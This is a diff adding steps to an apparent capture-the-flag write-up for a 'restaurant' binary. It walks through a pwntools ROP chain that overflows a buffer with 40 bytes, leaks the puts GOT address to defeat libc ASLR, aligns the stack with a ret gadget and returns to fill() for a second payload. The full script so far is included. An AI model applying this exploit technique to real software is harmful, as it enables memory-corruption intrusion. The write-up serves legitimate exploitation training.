@@ -103,6 +103,58 @@ rop.call(elf.plt['puts'], [next(elf.search(b''))])
 ![image](https://user-images.githubusercontent.com/70703371/218255496-cc815fca-1a32-463d-b481-de00220cb73a.png)
 
 
+16. Next, we need to call the `puts()` again and print the address stored in `got`, using this one line:
+
+```py
+rop.call(elf.plt['puts'], [elf.got['puts']])
+```
+
+17. Afterwards, we want to align the stack to 16 bytes by adding a dummy gadget that calls/returns to a gadget with only the "ret" instruction.
+18. Since it does nothing, so our whole ROP chain exploit shall aligned 16 bytes, it's important so our ROP chain shall executed successfully.
+
+```py
+rop_elf.call((rop_elf.find_gadget(["ret"]))[0])
+```
+
+19. Now we can go to `fill()` again by call the `fill()` offset.
+20. With this we can create the next payload.
+21. Then to get the libcASLR address, simply adding the offsetRSP by `rop.chain()`.
+
+> THE SCRIPT SO FAR
+
+```py
+from pwn import *
+import os
+
+os.system('clear')
+
+def start(argv=[], *a, **kw):
+    if args.REMOTE: 
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else: 
+        return process([exe] + argv, *a, **kw)
+
+exe = './restaurant'
+libc_library = './libc.so.6'
+elf = context.binary = ELF(exe, checksec=False)
+libc = context.binary = ELF(libc_library, checksec=False)
+context.log_level = 'debug'
+
+sh = start()
+
+offsetRsp = b'A' * 40
+rop = ROP(elf) 
+
+rop.call(elf.plt['puts'], [next(elf.search(b''))]) 
+rop.call(elf.plt['puts'], [elf.got['puts']])
+rop.call((rop.find_gadget(['ret']))[0]) 
+rop.call(elf.sym['fill']) 
+ropGetlibcaslr_addr = offsetRsp + rop.chain()
+log.info(rop.dump()) 
+```
+
+> OUTPUT
+
 
 
 > THE SCRIPT
